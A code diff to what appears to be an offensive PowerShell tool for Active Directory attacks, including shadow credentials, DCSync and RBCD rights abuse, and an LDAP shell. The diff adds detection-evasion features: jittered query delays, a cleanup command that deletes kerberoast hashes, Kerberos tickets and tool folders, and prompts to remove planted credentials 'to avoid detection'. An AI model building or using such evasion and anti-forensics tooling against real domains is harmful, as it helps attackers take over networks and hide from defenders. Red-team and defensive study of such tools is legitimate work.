@@ -269,6 +269,11 @@ function New-ShadowCredential {
     Write-Host "$Indent[i]   Rubeus  : Rubeus.exe asktgt /user:<target> /certificate:`"$pfxPath`" /password:`"$pfxPass`" /ptt" -ForegroundColor Gray
     Write-Host "$Indent[i]   certipy : certipy auth -pfx shadowcred-$ts.pfx -dc-ip <DC>" -ForegroundColor Gray
     Write-Host "$Indent[i]   PTC     : .\Invoke-PassTheCert.ps1 -PFXFile `"$pfxPath`" -PFXPassword `"$pfxPass`" -Action LdapShell" -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "$Indent--- OPSEC: Cleanup After Use ---" -ForegroundColor Yellow
+    Write-Host "$Indent[i] Remove credential when done to avoid detection:" -ForegroundColor DarkGray
+    Write-Host "$Indent[i]   LdapShell : clearcred <target>" -ForegroundColor Gray
+    Write-Host "$Indent[i]   Standalone: .\Invoke-ShadowCredentials.ps1 -Target <target> -Action Remove -DeviceId `"$devGuid`"" -ForegroundColor Gray
 
     return @{
         PFXFile     = $pfxPath
@@ -608,6 +613,10 @@ switch ($Action) {
         Write-Host "    dnsdel <name>              Delete DNS record" -ForegroundColor Gray
         Write-Host "    setattr <DN> <attr> <val>  Set LDAP attribute" -ForegroundColor Gray
         Write-Host ""
+        Write-Host "  OPSEC:" -ForegroundColor DarkCyan
+        Write-Host "    delay [ms] [jitter%]       Set query delay (e.g., delay 1000 50)" -ForegroundColor Gray
+        Write-Host "    cleanup                    Remove temp artifacts from disk" -ForegroundColor Gray
+        Write-Host ""
         Write-Host "    help / quit / exit" -ForegroundColor Gray
         Write-Host ""
 
@@ -698,6 +707,10 @@ switch ($Action) {
             $ldap.SendRequest($mod) | Out-Null
         }
 
+        # OPSEC: Query delay/jitter state
+        $script:queryDelay = 0
+        $script:queryJitter = 50
+
         # Helper: decode access mask to readable rights
         function Format-ADRights {
             param([int]$Mask)
@@ -749,6 +762,60 @@ switch ($Action) {
                     Write-Host "        delmember, shadowcred, clearcred, setrbcd, delrbcd, setdcsync," -ForegroundColor Gray
                     Write-Host "        addspn, delspn, setasrep, setowner, writedacl, disable, enable," -ForegroundColor Gray
                     Write-Host "        dnsadd, dnsdel, setattr" -ForegroundColor Gray
+                    continue
+                }
+                'delay' {
+                    if (-not $arg) {
+                        if ($script:queryDelay -gt 0) {
+                            Write-Host "  [i] Current delay: $($script:queryDelay)ms (+/- $($script:queryJitter)%)" -ForegroundColor Gray
+                        } else {
+                            Write-Host "  [i] No delay configured (queries execute immediately)" -ForegroundColor Gray
+                        }
+                        Write-Host "  Usage: delay <ms> [jitter%]  (e.g., delay 1000 50)" -ForegroundColor Yellow
+                        Write-Host "  Reset: delay 0" -ForegroundColor Yellow
+                        continue
+                    }
+                    $dParts = $arg -split '\s+'
+                    $script:queryDelay = [int]$dParts[0]
+                    $script:queryJitter = if ($dParts.Count -gt 1) { [Math]::Min(100, [Math]::Max(0, [int]$dParts[1])) } else { 50 }
+                    if ($script:queryDelay -le 0) {
+                        $script:queryDelay = 0
+                        Write-Host "  [+] Delay disabled" -ForegroundColor Green
+                    } else {
+                        Write-Host "  [+] Delay set: $($script:queryDelay)ms (+/- $($script:queryJitter)%)" -ForegroundColor Green
+                    }
+                    continue
+                }
+                'cleanup' {
+                    $cleanDirs = @("$env:TEMP\adcs-ops", "$env:TEMP\shadow-ops", "$env:TEMP\domain-recon")
+                    $cleanFiles = @("$env:TEMP\kerberoast-hashes.txt")
+                    $total = 0
+                    foreach ($d in $cleanDirs) {
+                        if (Test-Path $d) {
+                            $count = (Get-ChildItem $d -Recurse -File -ErrorAction SilentlyContinue | Measure-Object).Count
+                            Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
+                            $total += $count
+                            Write-Host "  [+] Removed: $d ($count files)" -ForegroundColor Green
+                        }
+                    }
+                    foreach ($f in $cleanFiles) {
+                        if (Test-Path $f) {
+                            Remove-Item $f -Force -ErrorAction SilentlyContinue
+                            $total++
+                            Write-Host "  [+] Removed: $f" -ForegroundColor Green
+                        }
+                    }
+                    $kirbiFiles = Get-Item "$env:TEMP\tgs-*.kirbi" -ErrorAction SilentlyContinue
+                    foreach ($k in $kirbiFiles) {
+                        Remove-Item $k.FullName -Force -ErrorAction SilentlyContinue
+                        $total++
+                        Write-Host "  [+] Removed: $($k.FullName)" -ForegroundColor Green
+                    }
+                    if ($total -eq 0) {
+                        Write-Host "  [i] No artifacts found to clean up" -ForegroundColor Gray
+                    } else {
+                        Write-Host "  [+] Cleaned $total artifact(s)" -ForegroundColor Cyan
+                    }
                     continue
                 }
                 'whoami' {
@@ -1778,7 +1845,13 @@ switch ($Action) {
                         } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                     }
                     try {
-                        New-ShadowCredential -TargetDN $scDN -Connection $ldap -OutDir "$env:TEMP\adcs-ops" -Indent "  " | Out-Null
+                        $scResult = New-ShadowCredential -TargetDN $scDN -Connection $ldap -OutDir "$env:TEMP\adcs-ops" -Indent "  "
+                        if ($scResult) {
+                            Write-Host ""
+                            Write-Host "  --- OPSEC: Cleanup After Use ---" -ForegroundColor Yellow
+                            Write-Host "  clearcred $scTarget" -ForegroundColor White
+                            Write-Host "  .\Invoke-ShadowCredentials.ps1 -Target `"$scTarget`" -Action Remove -DeviceId `"$($scResult.DeviceId)`"" -ForegroundColor White
+                        }
                     } catch {
                         Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                         Write-Host "  [i] Requires WriteProperty on msDS-KeyCredentialLink" -ForegroundColor Yellow
@@ -2341,6 +2414,13 @@ switch ($Action) {
             }
 
             if (-not $searchFilter) { continue }
+
+            # OPSEC: Apply query delay/jitter if configured
+            if ($script:queryDelay -gt 0) {
+                $range = [int]($script:queryDelay * $script:queryJitter / 100)
+                $actual = $script:queryDelay + (Get-Random -Minimum (-$range) -Maximum ($range + 1))
+                if ($actual -gt 0) { Start-Sleep -Milliseconds $actual }
+            }
 
             try {
                 $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
